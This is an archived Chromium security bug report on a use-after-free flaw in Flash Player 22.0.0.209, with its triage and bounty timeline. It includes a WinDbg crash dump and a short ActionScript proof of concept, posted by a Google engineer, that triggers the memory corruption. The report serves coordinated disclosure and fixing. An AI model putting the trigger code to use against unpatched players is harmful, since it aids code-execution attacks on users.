# Security: use-after-free vulnerability in flash player 22.0.0.209

| Field | Value |
|-------|-------|
| **Issue ID** | [40084919](https://issues.chromium.org/issues/40084919) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ji...@gmail.com |
| **Assignee** | na...@google.com |
| **Created** | 2016-07-22 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

There is a use-after-free vulnerability in flash player. Which could lead to code execution.

**VERSION**  

Flash player 22.0.0.209 in Chrome windows 7 x86(other platform should be trigger also)

Please drag the test.swf into chrome will crash.

Please not public in MAPP and public it in chrome issues list 14 weeks after being marked as Fixed.

Credit is to "JieZeng of Tencent Zhanlu Lab".

Please report it as soon as possible.

chrome crash tate:

5b6583f1 e88a830500 call pepflashplayer!PPP\_ShutdownBroker+0x1bf58d (5b6b0780)  

5b6583f6 84c0 test al,al  

5b6583f8 0f8502010000 jne pepflashplayer!PPP\_ShutdownBroker+0x16730d (5b658500)  

5b6583fe 8b450c mov eax,dword ptr [ebp+0Ch]  

5b658401 8b581c mov ebx,dword ptr [eax+1Ch]  

5b658404 83bbfc00000002 cmp dword ptr [ebx+0FCh],2 ds:0023:000000fc=????????

3:037> r  

eax=0250a1a0 ebx=00000000 ecx=00000000 edx=02706000 esi=00000000 edi=0250a1a0  

eip=5b658404 esp=0024d240 ebp=0024d450 iopl=0 nv up ei pl zr na pe nc  

cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246  

pepflashplayer!PPP\_ShutdownBroker+0x167211:  

5b658404 83bbfc00000002 cmp dword ptr [ebx+0FCh],2 ds:0023:000000fc=????????

3:037> dd eax  

0250a1a0 0250a560 00000000 00000000 00000000  

0250a1b0 00000000 00000000 00000000 00000000  

0250a1c0 00000000 00000000 00000000 00000000  

0250a1d0 00000000 00000000 00000000 00000000  

0250a1e0 00000000 00000000 00000000 00000000

## Attachments

- [test.swf](attachments/test.swf) (application/octet-stream, 48.2 KB)

## Timeline

### ke...@chromium.org (2016-07-22)

Natalie, can you please triage this and file a bug with Adobe?

### na...@google.com (2016-07-23)

Thanks for reporting this! I'll report it to Adobe shortly.

Adding an approximate ActionScript PoC for this issue, since one wasn't included in the bug:

var m = this.createEmptyMovieClip("m", 1, 1, 2, 3, 4);
var subm = m.createEmptyMovieClip("subm", 2, 1, 2, 3, 4);

function f(){

    m.removeMovieClip();
    return false;

}

subm.addProperty( "focusEnabled", f, f);
Selection.setFocus( "subm");

### sh...@chromium.org (2016-07-23)

[Empty comment from Monorail migration]

### ke...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>Flash]

### ke...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### ke...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### ji...@gmail.com (2016-07-26)

what is the PSIRT number?

### sh...@chromium.org (2016-07-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-26)

[Empty comment from Monorail migration]

### ji...@gmail.com (2016-07-29)

@natashenka: I want to know this issue whether have a PSIRT number? And if this issue submitted by others,please let me know as soon as possible. Thanks!

### na...@google.com (2016-07-29)

Sorry to take so long to get back to you. This is PSIRT-5643, and I haven't heard from Adobe when it will be fixed yet. As far as I know, no one else has submitted this issue via the Chrome tracker. Otherwise, Adobe generally doesn't let people know whether issues submitted to them were duplicates until the issue is fixed.

### ji...@gmail.com (2016-07-30)

@natashenka That's OK! I got it.

### oc...@chromium.org (2016-08-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-01)

[Empty comment from Monorail migration]

### ji...@gmail.com (2016-09-22)

[Comment Deleted]

### ji...@gmail.com (2016-09-22)

Hi,
Fixed in Sep and what is the next program ?

### na...@google.com (2016-09-22)

Marking this as fixed

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-25)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-09-26)

Your change meets the bar and is auto-approved for M54 (branch: 2840)

### sh...@chromium.org (2016-09-29)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-10-07)

Nothing to merge here.

### aw...@chromium.org (2016-10-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

And $3,000 for this one!

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2016-12-30)

This issue was migrated from crbug.com/chromium/630544?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084919)*
